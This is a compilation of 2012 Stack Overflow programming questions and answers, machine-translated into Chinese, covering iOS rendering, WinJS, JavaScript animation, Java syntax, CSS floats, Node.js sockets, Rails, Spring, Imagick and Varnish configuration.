# iphone - iOS UIImageView vs drawRect 图像拉伸

> ID：11702312
> 
> 赞同：2
> 
> 时间：2012-07-28T15:29:50.120
> 
> 标签：iphone, ios, ipad, uiimageview, drawrect

我在看一个 2011 年关于 UIKit 渲染的 WWDC 视频，这一部分讲述了 UIImageView 如何比使用 drawRect 更有效。这是会话显示的示例：

![在此处输入图像描述](../Images/4eb036264d10668c06fadbb5cd8896b3.png)

我不太清楚为什么使用 drawRect 但不使用 UIImageView 将图像拉伸到 320x200 需要额外的 250 Kbs？UIImageView 不需要相同数量的额外像素来调整图像大小和渲染图像吗？

有人可以解释一下吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:18:42.393

我在观众席中，我相信重点是，如果您使用 Quartz 创建新图像，然后绘制该图像，则必须首先将图像渲染到上下文中，然后再绘制该上下文。如果您使用 UIImageView 方法对小图像进行切片然后渲染，iOS 就会知道多次平铺小图像，因此永远不会创建一个巨大的上下文 (CGImage)。

# windows-8 - 无法更改弹出窗口的宽度

> ID：11702315
> 
> 赞同：7
> 
> 时间：2012-07-28T15:29:59.180
> 
> 标签：windows-8, microsoft-metro, winjs

我有一个弹出窗口，其 ID 为“productFlyout”。我试图设置它的背景颜色和宽度。它有红色，但宽度没有变化。似乎 Metro 不允许宽度太大。

JS文件：

```
productFlyout.winControl.show(dummyDOM, "bottom", "center"); 
```

CSS 文件：

```
#productFlyout {
   background: red;
    width: 1000px;
}

#productFlyout .win-flyout {
    width: 1000px;
    background: red;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-28T17:08:52.940

Flyout 默认设置有限制。在 ui-dark.css 或 ui-light.css 中快速搜索“.win-flyout”，您将看到以下默认设置：

*   最小宽度
*   最大宽度
*   最小高度
*   最大高度

您可以在 CSS 中覆盖它们，但请记住，Flyouts 的指导是使它们尽可能小。请参阅本文中的“设计弹出窗口”：

[“Flyouts 指南和清单”](http://msdn.microsoft.com/en-us/library/windows/apps/hh465341.aspx#designing_a_flyout)

# iphone - 如何更改 AppleID 以检索配置文件

> ID：11702317
> 
> 赞同：1
> 
> 时间：2012-07-28T15:30:06.970
> 
> 标签：iphone, ios, xcode

我已经搜索了很多 - 如果这个话题已经得到回答，请告诉我。

我在另一个团队工作了一年左右。现在我在一个新团队工作。我已经在 Apple 的开发者网站上使用启动助手设置了证书和配置文件。到目前为止一切正常。但是当我现在从 Xcode 进行刷新时，Xcode 似乎获得了旧团队的成员和个人资料。新的个人资料在管理器中显示为“未知”团队。

对我来说，看起来 Xcode 喜欢错误的 AppleID。我怎样才能改变这个？有没有一个地方可以让我从旧团队中注销 Xcode，然后再登录新团队？

提前致谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T15:44:37.517

打开`Keychain Access`并转到密码部分并删除与 Xcode 或 Apple Ex: 关联的密码`Apple ID Authentication`。

一旦你删除了正确的钥匙串，Xcode 会要求你登录，当它说“你想把它保存到钥匙串吗？” 说不

# javascript - 如何使用javascript移动图像

> ID：11702319
> 
> 赞同：3
> 
> 时间：2012-07-28T15:30:26.010
> 
> 标签：javascript, css, variables, positioning

我无法让这个图像向右移动，任何人都可以帮助我刚刚开始编写脚本，我发现它非常混乱。

```
<html>
<head>
</head>
<body style="margin:0px;">
<img id="tank" style="position:absolute;"src="tank.png"/>
<script type="text/javascript">
var change = document.getElementById('tank').style.left = '0';

while(change < 200)
{
change++;
}
</script>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:36:19.940

那个剧本有很多问题...

首先，您尝试将整数设置为 CSS 长度 - 非零长度需要一个您未提供的单位。

其次，原始值不会仅仅因为您想要它们而通过引用传递。然而，对象是。因此，您可以跟踪`document.getElementById('tank').style`并更改其`left`属性以移动图像。

第三，在脚本运行时浏览器不会重绘页面，这意味着如果你让脚本移动图像，它会立即在它的结束位置（你甚至不会在开始位置看到它，因为脚本立即运行）。

我认为这涵盖了您做错的所有事情。现在这里是如何正确地做到这一点。

```
(function() {
// don't leak variables into the global scope - think "variable = carbon dioxide"
    var elem = document.getElementById('tank'), pos = 0,
        timer = setInterval(function() {
            pos++;
            elem.style.left = pos+"px";
            if( pos == 200) clearInterval(timer);
        },25);
})(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T15:37:13.213

```
var change = document.getElementById('tank').style.left = '0'; 
```

在您的值之后添加“px”，并且还有一些大于 0 的值（如 200），以便更改可见。

`var change = document.getElementById('tank').style.left = '200px'`;

我想这就是你要找的

```
var image = document.getElementById('tank');
var change = 0;

setInterval(function(){
image.style.left = change+"px";
change+=5;
if(change>200){
clearInterval();
}
},50); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T15:35:40.753

要制作动画，您需要在计时器中更改样式属性......类似

```
var thank = document.getElementById("thank");
var x = 0;

setInterval(function(){ thank.style.left = x + "px"; x++; },
            20); // 20ms = 50 frames per second 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T15:36:10.827

while 循环根本不是您要寻找的，它会立即完成所有工作，或者如果条件始终为真，那么它将冻结您的页面，因为它是一个无限循环。

您可以`setInterval`改用：

```
<script type="text/javascript">
var left = 0, //Work with actual number type
    tank = document.getElementById('tank'),
    timerId = 0;

timerId = setInterval( function() { //This function is called by the browser every 33 milliseconds
    if( left++ > 200 ) {
        clearInterval( timerId ); //Stop the interval because left is > 200
    }
    tank.style.left = left + "px"; //Only convert to number + "px" when we need to set .style.left
}, 33 );
</script> 
```

演示[http://jsfiddle.net/Vhpc9/](http://jsfiddle.net/Vhpc9/)

# java - 找不到这个支架在哪里？

> ID：11702323
> 
> 赞同：0
> 
> 时间：2012-07-28T15:30:38.350
> 
> 标签：java, android

我不明白为什么 Eclipse 抱怨我的“OnClick”方法的第二个括号......

我知道这是一件简单的事情，但我似乎无法解决它！

我的活动代码：

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    CallService cs = new CallService();
    TotalTime = TotalTime + (cs.EndTime - cs.StartTime);
    Button button = (Button) findViewById(R.id.button1);

    button.setOnClickListener(new View.OnClickListener() {
        public void onClick(View v) {
            Toast toast = Toast.makeText(getApplicationContext(), ""+TotalTime, Toast.LENGTH_SHORT);
            toast.show();
        } // <-- Why is it complaining about this bracket?!
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T15:33:31.337

对于每个需要关闭的左括号或括号，您还需要用分号结束每个语句。编译器要`});`添加：

```
 // You open these, so you need to close them in order
   //                       v                           v
   button.setOnClickListener(new View.OnClickListener() {
       //                          v
       public void onClick(View v) {
           // Perform action on click

           Toast toast = Toast.makeText(getApplicationContext(), ""+TotalTime, Toast.LENGTH_SHORT);
           toast.show();
       }
   //  ^    
   }); // This is what the compiler wants
// ^^ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T15:34:00.790

你错过了这个：

```
button.setOnClickListener(new View.OnClickListener() {
    public void onClick(View v) {
        // Perform action on click
        Toast toast = Toast.makeText(getApplicationContext(), ""+TotalTime, Toast.LENGTH_SHORT);
        toast.show();
    }
}); // <------------- Close the parenthsesis!! 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T17:27:30.290

我建议您将代码放入 Eclipse 等 IDE 中。它通常会反映编译错误的点，因此您不必花费额外的精力来搜索此类错误。如果您想格式化代码，只需在 eclipse 中执行以下步骤

当您的光标位于编码区域时

按 ctrl + A // 它选择所有代码

然后按 ctrl + shift + F // 这会格式化您的代码

现在您可以轻松地找到括号的起点和终点，并且您的代码看起来格式正确。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-28T16:26:03.773

**1.**你在错误的地方**给了一个** `extra bracket`，**错过**了一个`bracket`和`a brace`一个`semicolon`。

**- 错误的：**

```
 new View.OnClickListener()) // Dont add ")" here. 
```

**- 正确的：**

```
 new View.OnClickListener() 
```

**- 错过：**

```
 } ); 
```

**2.在程序中将此部分替换为您的部分，它肯定会工作......**

```
button.setOnClickListener(new View.OnClickListener() {
           public void onClick(View v) {
               // Perform action on click

                   Toast toast = Toast.makeText(getApplicationContext(), ""+TotalTime, Toast.LENGTH_SHORT);
                   toast.show();
           }

       } ); 
```

**3.**为了**进一步方便，我在****你的整个工作代码**下面发布......

 ****//////////// 带有更正代码的整个 onCreate()/////////////**

```
public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        CallService cs= new CallService();

       TotalTime = TotalTime + (cs.EndTime-cs.StartTime);

       Button button = (Button) findViewById(R.id.button1);

       button.setOnClickListener(new View.OnClickListener() {
           public void onClick(View v) {
               // Perform action on click

                   Toast toast = Toast.makeText(getApplicationContext(), ""+TotalTime, Toast.LENGTH_SHORT);
                   toast.show();
           }

       } );   

    } 
```**

# html - 对浮动内容的容器应用填充或边距

> ID：11702325
> 
> 赞同：0
> 
> 时间：2012-07-28T15:30:50.260
> 
> 标签：html, css

考虑以下 html 结构：

```
<div class="entry">
    <h1>Title</h1>
    <p>...</p>
    <p>...</p>
    <div class="tagged">...</div>
    <div class="comments">...</div>
</div> 
```

CSS是：

```
.taggged { float: left; width: 50%; }
.comments { float: right; width: 50%; text-align: right; }
.entry { margin-bottom: 30px; } 
```

问题是边距（或填充，如果适用）没有呈现在`.entry`元素的底部。我尝试过`overflow: auto`的`.entry`各种排列`clear:`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T15:41:46.953

我会尝试

`.entry { overflow:hidden; margin-bottom:30px; }`

根据我的经验，另一件效果更好的事情是在源顺序中首先放置正确的浮动元素，如下所示：

```
<div class="entry">
    <h1>Title</h1>
    <p>...</p>
    <p>...</p>
    <div class="comments">...</div>
    <div class="tagged">...</div>
</div> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T15:38:29.487

在您的评论后添加一个元素（div 或 span）并明确说明：两者；在你的风格。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T15:43:45.537

我不确定您的代码中可能还有什么，但只需在[这个 fiddle](http://jsfiddle.net/86fs4/1/)上的 FF、Chrome 和 IE7+ 中添加`overflow: auto`（或）对我有用。我知道你说你尝试了第一个。`hidden`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-28T15:45:07.147

它似乎能够对其进行调整以按以下方式工作：

CSS：

```
 body { overflow: hidden; }
.taggged { float: left; width: 50%; }
.comments { float: right; width: 50%; text-align: right; margin-bottom: 30px; }
.entry { overflow: auto; width: 100%; } 
```

将边距移动到底部 div，并将条目更改为`width: 100%; overflow: auto;`. 我对其进行了测试，它可以在 Firefox 和 Opera 上运行。

[http://www.quirksmode.org/css/clearing.html](http://www.quirksmode.org/css/clearing.html)

# node.js - Node.JS 缓冲区后面有一个换行符

> ID：11702328
> 
> 赞同：2
> 
> 时间：2012-07-28T15:31:10.870
> 
> 标签：node.js

如何从此代码中删除换行符？

```
socket.on('data', function(data){
    console.log('Data in server, sending to handle()');
    worker.handle(data, socket);
}); 
```

工人.handle()：

```
exports.handle = function handle(command, socket) {
console.log('Data sent to handle()');
command = command.toString(); 
```

控制台.log（命令）；

编辑：

我得到这个输出：

```
test data
[newline] 
```

编辑2：

这是继续的代码：

```
if (command === 'look') {
    //stuff
}
if (command === 'login') {
    //stuff 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-29T05:05:13.360

这不是显示/演示问题。这是与数据传输协议有关的问题。Socket 是一种面向流的协议，这意味着它不是基于消息的。同时，您正在使用它，就像它是基于消息的一样 - 您可以这样做，但是您需要为您的发送者和接收者定义一个协议，以识别每条消息的开始和结束。

话虽如此，并根据您的要求，我假设您已决定使用换行符（或换行符的某种变体）作为消息结束标记。为了使这项工作正常工作，您需要主动在传入数据中查找该换行符，以便您可以识别每条消息的结尾并在处理之前将其剥离。

以下代码应替换您的 socket.on 方法以获得您想要的结果。

```
// define your terminator for easy reference, changes
var msgTerminator = '\n';
// create a place to accumulate your messages even if they come in pieces
var buf;

socket.on('data', function(data){
    // add new data to your buffer
    buf += data;

    // see if there is one or more complete messages
    if (buf.indexOf(msgTerminator) >= 0) {
        // slice up the buffer into messages
        var msgs = buf.split(msgTerminator);

        for (var i = 0; i < msgs.length - 2; ++i) {
            // walk through each message in order
            var msg = msgs[i];

            // pick off the current message
            console.log('Data in server, sending to handle()');
            // send only the current message to your handler
            worker.handle(msg, socket);
        }

        buf = msgs[msgs.length - 1];  // put back any partial message into your buffer
    }
}); 
```

# android - 将月份转换为 MMM 格式

> ID：11702334
> 
> 赞同：2
> 
> 时间：2012-07-28T15:32:26.523
> 
> 标签：android, calendar

我正在尝试使用 SimpleDateFormat 将我的月份转换为 MMM 格式，但我无法转换它。

```
 tvDisplayDate = (TextView) findViewById(R.id.dateDisplay);

    Calendar cal=Calendar.getInstance();

    SimpleDateFormat format = new SimpleDateFormat("MMM");

    int tempyear = cal.get(Calendar.YEAR);
    int tempmonth = cal.get(Calendar.MONTH);
    int tempday = cal.get(Calendar.DAY_OF_MONTH);

    String month = new Integer(tempmonth).toString(); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T15:39:48.797

以下作品（我刚刚测试过）

```
Calendar cal=Calendar.getInstance();
int tempmonth = cal.get(Calendar.MONTH);

SimpleDateFormat newformat = new SimpleDateFormat("MMM");
SimpleDateFormat oldformat = new SimpleDateFormat("MM");

        String monthName = null;
        Date myDate;
        try {
            myDate = oldformat.parse(String.valueOf(tempmonth));
            monthName = newformat.format(myDate);
        } catch (ParseException e) {
            e.printStackTrace();
        }

        Log.d("MMM", monthName); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T15:39:32.260

您实际上并没有使用您创建的格式。尝试：

```
String month = format.format(tempmonth); 
```

您可以使用以下命令一次格式化整个日期：

```
String dateString = sdf.format(cal.getTime()); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T15:44:23.413

我会说使用[Joda Time](http://joda-time.sourceforge.net/)会让这些事情变得更容易。

无论如何，这里的[这个](https://stackoverflow.com/questions/1038570/how-can-i-convert-an-integer-to-localized-month-name-in-java)问题有几个答案。

# javascript - jQuery 传播和多个类

> ID：11702336
> 
> 赞同：2
> 
> 时间：2012-07-28T15:33:00.153
> 
> 标签：javascript, jquery, html, css, propagation

- 更新 -

我有点愚蠢，子 UL 覆盖了父列表（不透明度淡出），所以我单击一次后无法单击组。哎呀！无论如何感谢帮助我的家伙！

* * *

jQuery 传播的问题是每个人都在努力解决的问题。但这是我的情况，我无处可修复（或者我可能很愚蠢，没有看正确的地方，或者我的 jQuery 技能还不够好，无法理解）。

基本情况是我有一些组，并且在组中有几个选项。当您单击其中一个组时，将弹出选项。但是，当我单击其中一个选项时，整个弹出活动再次触发，因为它是父母的孩子，所以他认出了孩子们所在的班级。

我的 HTML 如下所示：

```
<div id="buttons">
        <ul>
            <li class="group">Group 1
                <ul>
                    <li class="link">Link</li>
                </ul>
            </li>
            <li class="group">Group 2
                <ul>
                    <li class="link">Link</li>
                </ul>
            </li>
            <li class="group">Group 3
                <ul>
                    <li class="link">Link</li>
                </ul>
            </li>
            <li class="group">Group 4
                <ul>
                    <li class="link">Link</li>
                </ul>
            </li>
        </ul>
</div> 
```

我想这看起来很简单，我想这没有什么问题。它只是嵌套在列表中的列表。

但是我的 jQuery 代码。它看起来像这样：

```
$(".group").click(function(event) {

    // if ($(event.target).is('ul li ul li')) return false;

    $(".group").children("ul").animate({top: 0, opacity: 0}, 200);
    var liHeight = ($(this).children("ul").children("li").height())+20;
    var totalOptions = $(this).children("ul").children("li").length;
    var combinedHeight = totalOptions * liHeight;
    var slideIn = -(16+combinedHeight) // formula doing math on slidedistance
    $(this).children("ul").animate({
                            top: slideIn,
                            opacity: 1
                        }, 600);

    /*
    $(".link").click(function(event) {
        event.stopPropagation();
    });
    */

}); 
```

它的实际作用是：

1.  将组子级重置为默认顶部位置
2.  获取点击的组
3.  获取目标组的总孩子 ul 的高度
4.  为动画准备距离
5.  触发动画

随之而来的是没有问题，并且所有工作都按照我的意愿进行，但是当我单击`li`s 中的`ul`s 时，它只会继续触发动画，这不是计划的一部分。

我注释掉了你可能已经注意到的 2 块代码。这是我在网上寻找答案相关问题时发现的两种控制传播的不同方法。两者都没有好结果。发生的情况是传播实际上停止了，但它也无法点击不同的组。

简而言之，这就是问题所在。我想我只需要添加一两行，但我就是想不出应该适合什么，几乎尝试了所有想到的东西。

此外，如果您找不到任何答案但对代码标记或其他内容有一些反馈，也欢迎（我是交互设计/网络开发的学生，所以我也很感激:)）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T15:37:49.580

只需将以下代码移到`.group`点击处理程序之外：

```
$(".link").click(function(event) {
    event.stopPropagation();
}); 
```

完整代码：

```
$(".group").click(function(event) {

    // if ($(event.target).is('ul li ul li')) return false;

    $(".group").children("ul").animate({top: 0, opacity: 0}, 200);
    var liHeight = ($(this).children("ul").children("li").height())+20;
    var totalOptions = $(this).children("ul").children("li").length;
    var combinedHeight = totalOptions * liHeight;
    var slideIn = -(16+combinedHeight) // formula doing math on slidedistance
    $(this).children("ul").animate({
                            top: slideIn,
                            opacity: 1
                        }, 600);
});

$(".link").click(function(event) {
   event.stopPropagation();
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:21:22.163

您不应在`.group`项目上安装单击处理程序，而应仅在切换元素上。

```
<li class="group">
    <a class="toggle">Group 2</a>
    <ul>
        <!-- contents to show & hide -->
    </ul>
</li> 
```

```
$(".toggle").click(function(e) {
    $(this).next()... // to reference the ul
}) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:21:09.540

我会建议`click`听众的另一种方式。如果您使用jQuery中的[`on`方法- 您可以将侦听器委托给子元素。](http://api.jquery.com/on/)像这样：

```
$('#buttons').on('click', 'li', function(e){
    var li = $(this);

    if(li.hasClass('group')){
        alert('group was clicked');
    }
    else if(li.hasClass('link')){
        alert('link was clicked');
        e.stopPropagation();
    }
}); 
```

此代码的一个活生生的例子在这里 - [http://jsfiddle.net/skip405/YWzxB/](http://jsfiddle.net/skip405/YWzxB/)

注意：如果您删除委托中的`stopPropagation`部分`link`- 您将看到*两个*警报。首先 - 对于`link`，然后 - 对于`group`。

# ruby-on-rails - Rails 3.2.6 中的延迟加载

> ID：11702341
> 
> 赞同：17
> 
> 时间：2012-07-28T15:33:34.690
> 
> 标签：ruby-on-rails, activerecord

我在网上找到了几个资源，而不是做类似的事情：

```
cars = Car.where(:colour => 'black') 
```

查询不会执行，直到您执行以下操作：

```
cars.each {|c| puts c.name } 
```

但是，在我的 Rails 3.2.6 项目中，当我在控制台中执行以下操作时：

```
User.where(:first_name => "John") 
```

我得到以下信息：

```
 User Load (1.2ms)  SELECT `users`.* FROM `users` WHERE `users`.`first_name` = 'John' 
```

那么，查询正在执行吗？

延迟加载到哪里去了？或者我在这里错过了什么？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-07-28T15:43:04.443

控制台调用`inspect`您键入的任何表达式的结果，以便将其显示给您。`inspect`是会触发查询负载的事情之一。如果你改为

```
x = User.where(:first_name => 'John'); false 
```

那么您应该看不到任何查询，因为这次控制台调用了检查`false`而不是 Active Record 关系对象。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-28T16:04:54.500

这是一个有趣的问题……答案是在 IRB/控制台中执行某些操作时，它会在结果对象上调用检查，然后将其打印出来。如果你做了类似的事情：

```
User.where(:first_name => "John").class 
```

你应该得到一个 ActiveRecord::Relation 对象。

所以 Rails 的延迟加载仍然有效，这只是控制台的工作方式。

希望这可以帮助。

来源：1）[https://rails.lighthouseapp.com/projects/8994/tickets/4951-rails-console-executes-where-queries-without-lazy-loading](https://rails.lighthouseapp.com/projects/8994/tickets/4951-rails-console-executes-where-queries-without-lazy-loading) 2）[为什么没有返回 Active Record 关系安慰？](https://stackoverflow.com/questions/7646199/why-active-record-relation-is-not-returned-in-console)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2015-03-19T00:38:40.917

我使用 sqllite3 进行了测试，试图找出 AR Base find 是否确实立即进行了查询。这是我所做的：

```
rows=Customer.orders.find(1,2) 
```

然后我做了：

```
ActiveRecord::Base.remove_connection;
p rows 
```

我收到未建立连接错误。

我还在查询后立即尝试了“p 行”，没有删除连接，并得到了我期望的 2 行。

这是使用 activerecord-3.1.3 完成的。我的结论是，在 3.1.3 中，base find 等待执行查询，直到访问数组（关系？）。

我是 Ruby 的新手，所以我的测试可能设计不正确。

# ruby-on-rails - Rspec 让变量不是 Mailer 的参数

> ID：11702344
> 
> 赞同：0
> 
> 时间：2012-07-28T15:33:53.543
> 
> 标签：ruby-on-rails, ruby-on-rails-3, rspec, ruby-on-rails-3.2, rspec2

在我的测试中，Rpec，我有这个

```
 before { @user = create(:user) }
   let(:mail) { SignUpMailer.message(@user) } 
```

然后我得到一个错误：

```
 Failure/Error: @mail = SignUpMailer.message(@user) }
     ArgumentError:
       wrong number of arguments (0 for 1) 
```

我也试过：

```
before { @user = create(:user)
         @mail = SignUpMailer.message(@user) } 
```

但它仍然说上面的错误。有什么想法吗？

**编辑：** 邮件代码

```
class SignUpMailer < ActionMailer::Base
  default from: "Assign It App <support@assignitapp.com>"

      # Subject can be set in your I18n file at config/locales/en.yml
      # with the following lookup:
      #
      #   en.sign_up_mailer.message.subject
      #
      def message(user)
        @sign_in_url = sign_in_url
        @user_name = user.name
        mail subject: "Welcome to Assign It App"
        mail to: user.email
      end
    end 
```

**另一种解决方法：**

```
before { @user = create(:user) }
let(:mail) { SignUpMailer.message([@user]) } 
```

哪个给我

```
 Failure/Error: let(:mail) { SignUpMailer.message([@user]) }
     NoMethodError:
       undefined method `name' for #<Array:0xa0c9860> 
```

所以邮件程序确实接受参数。

# u-boot - 如何保留一个 RAM 区域来存储一些防热复位数据？

> ID：11702345
> 
> 赞同：2
> 
> 时间：2012-07-28T15:33:53.223
> 
> 标签：u-boot

我有一块带有 ppc405、128M RAM 的板，并使用 u-boot + linux 2.6.10 内核启动。出于某种原因，我需要确保一些数据在热重置后能够存活。据我所知，u-boot 对此有一个参数“pram=”，即所谓的“protected ram”。但是我不知道接下来要做什么，我应该编写一个驱动程序以便应用程序可以访问该 RAM 区域吗？

# objective-c - “_OBJC_CLASS_$_ASIHTTPRequest”，引用自：使用ASIHTTP请求时

> ID：11702353
> 
> 赞同：0
> 
> 时间：2012-07-28T15:35:26.430
> 
> 标签：objective-c, ios5, asihttprequest

> **可能重复：**
> [ASIHTTPRequest 构建/链接错误](https://stackoverflow.com/questions/3742775/asihttprequest-build-link-error)

嗨，我只是盯着使用 ASIHTTP 请求。我已经包含了所有指定的类。当我在没有代码的情况下运行我的应用程序时，它运行良好，但是当我包含一段代码时，它显示链接器错误“_OBJC_CLASS_$_ASIHTTPRequest”，引用自: 和 clang: 错误：链接器命令失败，退出代码为 1（使用 -v 查看调用）

这就是我写的

{ - (void)viewDidLoad {

```
NSString *url=[NSString stringWithFormat:@"http://allseeing-i.com"]; 
```

request=[ASIHTTPRequest requestWithURL:[NSURL URLWithString:url]]; [请求启动异步];

```
[request setDidReceiveDataSelector:@selector(didReceiveDataSelector)];
[request setDidFinishSelector:@selector(didFinishSelector)];
[request setDidFailSelector:@selector(didFinishSelector)];

[super viewDidLoad];
// Do any additional setup after loading the view, typically from a nib. 
```

} }

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T15:54:15.750

正如错误所说，这是一个链接器问题而不是代码问题。我对 ASIHTTP 本身并不熟悉，但您需要将其添加到目标的 Build Phases 选项卡中。如果它作为源分发，则将其置于编译阶段，或者，如果它作为静态库分发，则将其放入链接阶段。

# java - 无法解决 org.springframework.transaction.annotation.Transactional 的依赖关系

> ID：11702364
> 
> 赞同：3
> 
> 时间：2012-07-28T15:36:39.550
> 
> 标签：java, hibernate, spring-mvc, spring-annotations

我是基于注释的编程的新手，不知道要为**org.springframework.transaction.annotation.Transactional**添加到我的 pom.xml 中的 Maven 工件，我用谷歌搜索（比如搜索结果的前 5 页）但找不到什么是我在寻找。我正在使用 spring 3。另外，如果有任何在线教程可以了解更多关于 spring 中的注释。谢谢！！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-28T16:59:50.170

它在[spring-tx](http://mvnrepository.com/artifact/org.springframework/spring-tx)中。

[Spring 文档](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/htmlsingle/spring-framework-reference.html)很好地涵盖了 Spring 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-10T05:34:17.677

前一个答案的特例。如果你使用mybatis和maven，

```
<dependency>
    <groupId>org.mybatis</groupId>
    <artifactId>mybatis-spring</artifactId>
    <version>1.1.1</version>
</dependency> 
```

将为您导入 spring-tx 包：

```
[INFO] +- org.mybatis:mybatis:jar:3.1.1:compile
[INFO] +- org.mybatis:mybatis-spring:jar:1.1.1:compile
[INFO] |  +- org.springframework:spring-tx:jar:3.1.1.RELEASE:compile
[INFO] |  \- org.springframework:spring-jdbc:jar:3.1.1.RELEASE:compile 
```

# c# - 有哪些动态加载图像的好方法？

> ID：11702366
> 
> 赞同：0
> 
> 时间：2012-07-28T15:37:12.240
> 
> 标签：c#, javascript, loading

我有一个主页。我想做很多网站目前正在做的事情，他们动态显示一些大图像。具体来说，我有 5 个 900 像素 x 400 像素的图像要显示 - 我可以使用 Javascript setInterval 等来完成 - 但我也想知道如何添加一些淡入淡出效果 - 我正在用 c# 编码，但是我能想到的唯一优雅的方法是使用 javascript - 如果有人可以给我一个教程链接或粘贴他们喜欢的代码片段，我将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T15:51:21.273

用 C# 编码不会让你产生淡化效果，你需要 Javascript。当然，您可以使用 C# 加载图像的第一个实例，但任何带有效果或计时器的内容都需要使用 Javascript 或 jQuery。大多数网站实际上会使用 jQuery 插件来实现这个主要的淡入/淡出幻灯片功能。那里有很多对您有好处的滑块插件。

如果你觉得你想建立自己的，这里有一些可以让你前进的东西。

```
<img src="img0.jpg">
<img src="img1.jpg">
<img src="img2.jpg">
<img src="img3.jpg">

$(function() {

    var i = 0;

    // Four-second interval
    setInterval(function() {
        $("#img").fadeOut(function() {
            $(this).attr("src", "img" + i++ % 4 + ".jpg");
            $(this).fadeIn();
        });
    }, 4000);
} 
```

每 4 秒它会遍历图像 1 到 4，淡入淡出。

或者，您可以只下载一个预构建的 jQuery 滑块插件，如下所示：

*   [http://nivo.dev7studios.com/](http://nivo.dev7studios.com/)
*   [http://slidesjs.com/](http://slidesjs.com/)
*   [http://snook.ca/technical/fade/fade.html](http://snook.ca/technical/fade/fade.html)
*   [http://wowslider.com/](http://wowslider.com/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T15:46:05.530

你需要的是一个 jQuery 图像轮播。

在这里放一些最好的链接。

1) [http://wowslider.com/demo.html](http://wowslider.com/demo.html)：很棒的一块，可以很好地集成。
2) [http://www.jcoverflip.com/](http://www.jcoverflip.com/)
3) [http://galleria.io/](http://galleria.io/) : 现象级

您还可以查看[jQuery 效果](http://api.jquery.com/category/effects/)，以便您可以更好地实现自己的效果。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:13:22.380

BXSlider 是一个很棒的轻量级简单易用的 jquery 滑块。

请参阅[http://bxslider.com](http://bxslider.com)。

特征

*   水平、垂直和淡入淡出过渡
*   一次显示和移动多张幻灯片（轮播）
*   上一个/下一个，寻呼机，自动控制
*   轻松过渡
*   随机开始
*   代码模式
*   before, after, first, last, next, prev 回调函数
*   包括可选样式
*   大量的选择

# php - 图像包含 imagick 错误

> ID：11702369
> 
> 赞同：0
> 
> 时间：2012-07-28T15:37:17.257
> 
> 标签：php, imagick

```
<?php

header('Content-type: image/jpeg');

$image = new Imagick('image.jpg');

// If 0 is provided as a width or height parameter,
// aspect ratio is maintained
$image->thumbnailImage(100, 0);

echo $image;

?> 
```

给出错误图像“http://localhost/test/into.php”无法显示，因为它包含错误。请解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2020-05-29T09:26:52.513

请阅读注释行中的详细信息

```
<?php

//drawing stuff that creates $image

ob_get_clean(); //this statement is what mine was lacking before I could get it to work properly
header("Content-type: image/png");
echo $image; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T15:49:40.697

您的图像是在 0 px 高度创建的，并且格式可能无效。尝试并查看[文档](http://www.php.net/manual/en/imagick.thumbnailimage.php)。

```
$image->thumbnailImage(100, 100); 
```

# varnish - 清漆：如何在缓存每页而不是每个用户的同时保留用户 cookie

> ID：11702370
> 
> 赞同：0
> 
> 时间：2012-07-28T15:37:19.580
> 
> 标签：varnish, varnish-vcl

我有一个页面，其内容将显示给所有用户，但问题是我在页面加载后完成了一个 ajax 调用，此调用不可缓存，但它需要从缓存页面中删除的 cookie，我该怎么办保留 cookie 并仍然获取缓存页面？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:55:44.313

在 vcl_hash 例程中，您可以准确决定如何散列您的请求。例如，以下内容只会对请求 URI 进行哈希处理，而不包括 cookie：

```
sub vcl_hash {
    set req.hash += req.url;
    set req.hash += req.http.host;
} 
```

请注意，您可能希望排除 ajax 调用和任何其他在您的配置中不可缓存的请求。或者更好的是，如果请求是可缓存的，则让后端发送一个标头，然后让 varnish 对其进行处理。

请注意使用 setcookie 缓存页面，它应该没问题。

# objective-c - ObjectiveC 中的 ARC 如何改变自动释放的使用？（例如在描述方法中）

> ID：11702373
> 
> 赞同：1
> 
> 时间：2012-07-28T15:37:25.663
> 
> 标签：objective-c, ios5, memory-management

